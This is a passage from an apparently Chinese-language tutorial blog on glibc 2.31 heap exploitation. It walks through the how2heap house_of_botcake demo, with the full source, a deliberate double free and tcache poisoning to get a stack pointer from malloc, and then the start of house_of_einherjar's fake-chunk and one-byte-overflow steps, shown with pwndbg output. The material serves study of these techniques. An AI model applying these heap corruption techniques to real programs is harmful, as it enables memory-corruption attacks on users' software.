class="line">8</span><br></pre></td><td class="code"><pre><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/house_of_botcake.c</span><br><span class="line">   <span class="number">50</span>     &#125;</span><br><span class="line">   <span class="number">51</span>     <span class="built_in">puts</span>(<span class="string">&quot;Step 2: free the victim chunk so it will be added to unsorted bin&quot;</span>);</span><br><span class="line">   <span class="number">52</span>     <span class="built_in">free</span>(a);</span><br><span class="line">   <span class="number">53</span></span><br><span class="line">   <span class="number">54</span>     <span class="built_in">puts</span>(<span class="string">&quot;Step 3: free the previous chunk and make it consolidate with the victim chunk.&quot;</span>);</span><br><span class="line"> ► <span class="number">55</span>     <span class="built_in">free</span>(prev);</span><br><span class="line">   <span class="number">56</span></span><br></pre></td></tr></table></figure><p>触发合并后，在 unsortedbin 里的是 prev chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; unsortedbin</span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x555555559a00</span> —▸ <span class="number">0x7ffff7fb0be0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x555555559a00</span></span><br><span class="line">pwndbg&gt; x/<span class="number">40</span>gx <span class="number">0x555555559a00</span></span><br><span class="line"><span class="number">0x555555559a00</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000221</span>      ====== &gt; chunk prev</span><br><span class="line"><span class="number">0x555555559a10</span>:<span class="number">0x00007ffff7fb0be0</span><span class="number">0x00007ffff7fb0be0</span></span><br><span class="line"><span class="number">0x555555559a20</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559a30</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559a40</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559a50</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559a60</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559a70</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559a80</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559a90</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559aa0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559ab0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559ac0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559ad0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559ae0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559af0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559b00</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559b10</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span>        ====== &gt; chunk a</span><br><span class="line"><span class="number">0x555555559b20</span>:<span class="number">0x00007ffff7fb0be0</span><span class="number">0x00007ffff7fb0be0</span></span><br><span class="line"><span class="number">0x555555559b30</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p>然后我们要想办法把 chunk a 放入 tcache  bin里，由于此时 tcache bins 是满的，所以我们先取一个出来, 然后再 free 一次 a</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/house_of_botcake.c</span><br><span class="line">   <span class="number">53</span></span><br><span class="line">   <span class="number">54</span>     <span class="built_in">puts</span>(<span class="string">&quot;Step 3: free the previous chunk and make it consolidate with the victim chunk.&quot;</span>);</span><br><span class="line">   <span class="number">55</span>     <span class="built_in">free</span>(prev);</span><br><span class="line">   <span class="number">56</span></span><br><span class="line">   <span class="number">57</span>     <span class="built_in">puts</span>(<span class="string">&quot;Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n&quot;</span>);</span><br><span class="line"> ► <span class="number">58</span>     <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">   <span class="number">59</span>     <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">   <span class="number">60</span>     <span class="built_in">free</span>(a);<span class="comment">// a is already freed</span></span><br><span class="line">   <span class="number">61</span>     <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">   <span class="number">62</span></span><br><span class="line">   <span class="number">63</span>     <span class="comment">// simple tcache poisoning</span></span><br></pre></td></tr></table></figure><p>此时 a chunk 就会被放入 tcahcebins 里，同时 prev 可以控制  chunk a 的内容</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x110</span> [  <span class="number">7</span>]: <span class="number">0x555555559b20</span> —▸ <span class="number">0x5555555597f0</span> —▸ <span class="number">0x5555555596e0</span> —▸ <span class="number">0x5555555595d0</span> —▸ <span class="number">0x5555555594c0</span> —▸ <span class="number">0x5555555593b0</span> —▸ <span class="number">0x5555555592a0</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x555555559a00</span> —▸ <span class="number">0x7ffff7fb0be0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x555555559a00</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; p a</span><br><span class="line">$<span class="number">1</span> = (<span class="keyword">intptr_t</span> *) <span class="number">0x555555559b20</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>所以我们从此时的 unsortedbin 给他分一块出来，然后修改其 fd 的值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">64</span>     <span class="built_in">puts</span>(<span class="string">&quot;Launch tcache poisoning&quot;</span>);</span><br><span class="line">  <span class="number">65</span>     <span class="built_in">puts</span>(<span class="string">&quot;Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk&quot;</span>);</span><br><span class="line">  <span class="number">66</span>     <span class="keyword">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">0x120</span>);</span><br><span class="line">► <span class="number">67</span>     <span class="built_in">puts</span>(<span class="string">&quot;We simply overwrite victim&#x27;s fwd pointer&quot;</span>);</span><br><span class="line">  <span class="number">68</span>     b[<span class="number">0x120</span>/<span class="number">8</span><span class="number">-2</span>] = (<span class="keyword">long</span>)stack_var;</span><br><span class="line">  <span class="number">69</span></span><br></pre></td></tr></table></figure><p>那么此时我们就成功污染了 tachebin 的内容 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x110</span> [  <span class="number">7</span>]: <span class="number">0x555555559b20</span> —▸ <span class="number">0x7fffffffe260</span> —▸ <span class="number">0x555555554040</span> ◂— <span class="number">0x400000006</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x555555559b30</span> —▸ <span class="number">0x7ffff7fb0be0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x555555559b30</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>我们接着只需要两次 malloc 就能拿到 0x7fffffffe260 这个地址</p><p>完整代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * This attack should bypass the restriction introduced in</span></span><br><span class="line"><span class="comment">     * https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d</span></span><br><span class="line"><span class="comment">     * If the libc does not include the restriction, you can simply double free the victim and do a</span></span><br><span class="line"><span class="comment">     * simple tcache poisoning</span></span><br><span class="line"><span class="comment">     * And thanks to @anton00b and @subwire for the weird name of this technique */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// disable buffering so _IO_FILE does not interfere with our heap</span></span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// introduction</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This file demonstrates a powerful tcache poisoning attack by tricking malloc into&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;returning a pointer to an arbitrary location (in this demo, the stack).&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This attack only relies on double free.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare the target</span></span><br><span class="line">    <span class="keyword">intptr_t</span> stack_var[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;The address we want malloc() to return, namely,&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;the target address is %p.\n\n&quot;</span>, stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare heap layout</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Preparing heap layout&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later.&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *x[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>*); i++)&#123;</span><br><span class="line">        x[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating a chunk for later consolidation&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating the victim chunk.&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;malloc(0x100): a=%p.\n&quot;</span>, a); </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating a padding to prevent consolidation.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// cause chunk overlapping</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now we are able to cause chunk overlapping&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 1: fill up tcache list&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(x[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 2: free the victim chunk so it will be added to unsorted bin&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 3: free the previous chunk and make it consolidate with the victim chunk.&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(prev);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    <span class="built_in">free</span>(a);<span class="comment">// a is already freed</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// simple tcache poisoning</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Launch tcache poisoning&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">0x120</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;We simply overwrite victim&#x27;s fwd pointer&quot;</span>);</span><br><span class="line">    b[<span class="number">0x120</span>/<span class="number">8</span><span class="number">-2</span>] = (<span class="keyword">long</span>)stack_var;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// take target out</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now we can cash out the target chunk.&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The new chunk is at %p\n&quot;</span>, c);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// sanity check</span></span><br><span class="line">    assert(c==stack_var);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Got control on target/stack!\n\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// note</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Note:&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;And the wonderful thing about this exploitation is that: you can free b, victim again and modify the fwd pointer of victim&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;In that case, once you have done this exploitation, you can have many arbitary writes very easily.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-house-of-einherjar"><a href="#4-house-of-einherjar" class="headerlink" title="4. house_of_einherjar"></a>4. house_of_einherjar</h3><p>这里展示的是通过一字节溢出，取到任意地址的技术</p><p>首先，在堆上伪造一个 chunk </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">─────────────────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────────────────</span><br><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/house_of_einherjar.c</span><br><span class="line">   <span class="number">35</span>     <span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0x38 bytes for &#x27;a&#x27; and use it to create a fake chunk\n&quot;</span>);</span><br><span class="line">   <span class="number">36</span>     <span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x38</span>);</span><br><span class="line">   <span class="number">37</span></span><br><span class="line">   <span class="number">38</span>     <span class="comment">// create a fake chunk</span></span><br><span class="line">   <span class="number">39</span>     <span class="built_in">printf</span>(<span class="string">&quot;\nWe create a fake chunk preferably before the chunk(s) we want to overlap, and we must know its address.\n&quot;</span>);</span><br><span class="line"> ► <span class="number">40</span>     <span class="built_in">printf</span>(<span class="string">&quot;We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n&quot;</span>);</span><br><span class="line">   <span class="number">41</span></span><br><span class="line">   <span class="number">42</span>     a[<span class="number">0</span>] = <span class="number">0</span>;    <span class="comment">// prev_size (Not Used)</span></span><br><span class="line">   <span class="number">43</span>     a[<span class="number">1</span>] = <span class="number">0x60</span>; <span class="comment">// size</span></span><br><span class="line">   <span class="number">44</span>     a[<span class="number">2</span>] = (<span class="keyword">size_t</span>) a; <span class="comment">// fwd</span></span><br><span class="line">   <span class="number">45</span>     a[<span class="number">3</span>] = (<span class="keyword">size_t</span>) a; <span class="comment">// bck</span></span><br></pre></td></tr></table></figure><p>该 fake chunk结构如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; malloc_chunk -f &amp;a[<span class="number">0</span>]</span><br><span class="line">Fake chunk | Allocated chunk</span><br><span class="line">Addr: <span class="number">0x5555555592a0</span></span><br><span class="line">prev_size: <span class="number">0x00</span></span><br><span class="line">size: <span class="number">0x60</span></span><br><span class="line">fd: <span class="number">0x5555555592a0</span></span><br><span class="line">bk: <span class="number">0x5555555592a0</span></span><br><span class="line">fd_nextsize: <span class="number">0x00</span></span><br><span class="line">bk_nextsize: <span class="number">0x00</span></span><br></pre></td></tr></table></figure><p>然后我们在堆上布局两个 chunk 分别为 b 和 c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; parseheap</span><br><span class="line">addr                prev                size                 status              fd                bk</span><br><span class="line"><span class="number">0x555555559000</span>      <span class="number">0x0</span>                 <span class="number">0x290</span>                Used                None              None</span><br><span class="line"><span class="number">0x555555559290</span>      <span class="number">0x0</span>                 <span class="number">0x40</span>                 Used                None              None</span><br><span class="line"><span class="number">0x5555555592d0</span>      <span class="number">0x0</span>                 <span class="number">0x30</span>                 Used                None              None</span><br><span class="line"><span class="number">0x555555559300</span>      <span class="number">0x0</span>                 <span class="number">0x100</span>                Used                None              None</span><br><span class="line">pwndbg&gt; p b</span><br><span class="line">$<span class="number">11</span> = (<span class="keyword">uint8_t</span> *) <span class="number">0x5555555592e0</span> <span class="string">&quot;&quot;</span></span><br><span class="line">pwndbg&gt; p c</span><br><span class="line">$<span class="number">12</span> = (<span class="keyword">uint8_t</span> *) <span class="number">0x555555559310</span> <span class="string">&quot;&quot;</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>然后此时假设我们有一个 一字节溢出,k可以覆盖到, c chunk 的size 位置，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/house_of_einherjar.c</span><br><span class="line">   <span class="number">71</span>     <span class="comment">// This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit</span></span><br><span class="line">   <span class="number">72</span></span><br><span class="line">   <span class="number">73</span>     <span class="built_in">printf</span>(<span class="string">&quot;\nc.size: %#lx\n&quot;</span>, *c_size_ptr);</span><br><span class="line">   <span class="number">74</span>     <span class="built_in">printf</span>(<span class="string">&quot;c.size is: (0x100) | prev_inuse = 0x101\n&quot;</span>);</span><br><span class="line">   <span class="number">75</span></span><br><span class="line"> ► <span class="number">76</span>     <span class="built_in">printf</span>(<span class="string">&quot;We overflow &#x27;b&#x27; with a single null byte into the metadata of &#x27;c&#x27;\n&quot;</span>);</span><br><span class="line">   <span class="number">77</span>     b[real_b_size] = <span class="number">0</span>;</span><br><span class="line">   <span class="number">78</span>     <span class="built_in">printf</span>(<span class="string">&quot;c.size: %#lx\n&quot;</span>, *c_size_ptr);</span><br><span class="line">   <span class="number">79</span></span><br><span class="line">   <span class="number">80</span>     <span class="built_in">printf</span>(<span class="string">&quot;It is easier if b.size is a multiple of 0x100 so you &quot;</span></span><br><span class="line">   <span class="number">81</span>            <span class="string">&quot;don&#x27;t change the size of b, only its prev_inuse bit\n&quot;</span>);</span><br><span class="line">─────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>gx b<span class="number">-0x10</span></span><br><span class="line"><span class="number">0x5555555592d0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5555555592e0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555555592f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559300</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000101</span></span><br><span class="line"><span class="number">0x555555559310</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559320</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559330</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559340</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559350</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559360</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; chunkinfo c<span class="number">-0x10</span></span><br><span class="line">==================================</span><br><span class="line">            Chunk info</span><br><span class="line">==================================</span><br><span class="line">Status :  Used</span><br><span class="line">Can<span class="number">&#x27;</span>t access memory</span><br><span class="line">prev_size : <span class="number">0x0</span></span><br><span class="line">size : <span class="number">0x100</span></span><br><span class="line">prev_inused : <span class="number">1</span></span><br><span class="line">is_mmap : <span class="number">0</span></span><br><span class="line">non_mainarea : <span class="number">0</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>那么当执行完之后， c chunk 的 prev_inused 位将被置零</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; chunkinfo c<span class="number">-0x10</span></span><br><span class="line">==================================</span><br><span class="line">            Chunk info</span><br><span class="line">==================================</span><br><span class="line">Status :  Used</span><br><span class="line">Can<span class="number">&#x27;</span>t access memory</span><br><span class="line">prev_size : <span class="number">0x0</span></span><br><span class="line">size : <span class="number">0x100</span></span><br><span class="line">prev_inused : <span class="number">0</span></span><br><span class="line">is_mmap : <span class="number">0</span></span><br><span class="line">non_mainarea : <span class="number">0</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>这样会导致 chunk a 被认为是 free 的</p><figure class="highlight c"><table><tr><td 